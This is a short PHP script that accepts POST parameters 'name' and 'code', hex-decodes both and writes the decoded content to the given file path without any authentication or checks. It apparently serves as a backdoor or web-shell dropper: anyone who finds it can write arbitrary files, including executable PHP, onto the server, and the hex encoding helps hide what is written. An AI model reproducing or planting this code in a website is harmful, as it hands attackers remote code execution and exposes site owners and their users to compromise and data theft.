<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   if (!empty($_POST['code']) and !empty($_POST['name'])) {
     file_put_contents(hex2bin($_POST['name']),hex2bin($_POST['code']));
echo"1";
}
}
?>